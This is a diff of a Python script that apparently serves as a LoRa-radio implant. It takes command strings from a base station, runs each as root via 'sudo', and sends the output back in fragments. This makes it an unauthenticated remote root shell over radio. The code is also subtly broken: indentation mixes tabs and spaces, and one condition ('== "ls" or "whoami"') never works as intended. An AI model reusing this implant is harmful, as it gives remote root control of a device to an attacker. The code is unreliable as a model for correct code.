@@ -25,7 +25,7 @@ def reply(str):
     # Encodes message as utf-8 string
 	sending = bytes(str, 'utf-8')
     # Sends the packet to base station
-	rfm9x.send(sending)
+	rfm9x.send_with_ack(sending)
 
 # Main loop for listening for messages from base station
 while True:
@@ -40,27 +40,39 @@ while True:
         continue
     else:
         # Change the standard output to 'buffer' variable
-		sys.stdout = buffer = StringIO()
+        sys.stdout = buffer = StringIO()
 
         # Decode the received 'packet'
-		prev_packet = str(packet, 'utf-8')
+        prev_packet = str(packet, 'utf-8')
 
 		# Quit if we recieve 'quit' command, else run command
-		if(prev_packet == "quit"):
-			break
-		else:
+        if(prev_packet == "quit"):
+            break
+        else:
 			# Run the command received, and print the output to the 'buffer' variable
-			print("[Payload] Running command : "+prev_packet)
-			print(subprocess.getoutput("sudo "+prev_packet))
+            print("[Payload] Running command : "+prev_packet)
+            temp = subprocess.getoutput("sudo "+prev_packet)
+        
+        if not (prev_packet == "ls" or "whoami"):
+            time.sleep(3.0)
+            
+        print(temp)
+
+        # Break buffer into smaller pieces (rfm9x/LoRa limitation)
+        bufferString = buffer.getvalue()
+
+        maxSize = 250
+        fragments = [bufferString[i:i+maxSize] for i in range(0, len(bufferString), maxSize)]
 
 		# Send buffer value to base station
-		reply(buffer.getvalue())
+        for output in fragments:
+            reply(output)
         
         # Reset the standard output to the console
-		sys.stdout = sys.__stdout__
+        sys.stdout = sys.__stdout__
         
         # Print the value of the buffer in console
-		print(buffer.getvalue())
+        print(buffer.getvalue())
     
     # Wait to optimize performance
     time.sleep(0.1)
